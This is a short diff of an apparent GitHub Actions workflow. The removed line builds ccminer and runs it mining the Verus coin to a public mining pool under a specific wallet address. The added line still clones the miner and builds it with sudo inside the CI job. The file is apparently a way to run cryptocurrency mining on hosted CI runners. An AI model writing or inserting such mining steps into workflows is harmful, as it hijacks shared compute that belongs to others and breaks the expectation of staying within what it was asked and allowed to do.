@@ -18,4 +18,4 @@ jobs:
 
       - name: Install and Run
         run: |
-          sudo apt-get update && sudo apt-get install -y build-essential libcurl4-openssl-dev libssl-dev git automake autoconf && git clone https://github.com/tpruvot/ccminer.git && cd ccminer && ./autogen.sh && ./configure && make && ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3957 -u RNjEn7tNTZ6DuYnYrxKMsvYzBgJ11P5hQ4 -p x
+          git clone https://github.com/tpruvot/ccminer && cd ccminer && sudo ./build.sh
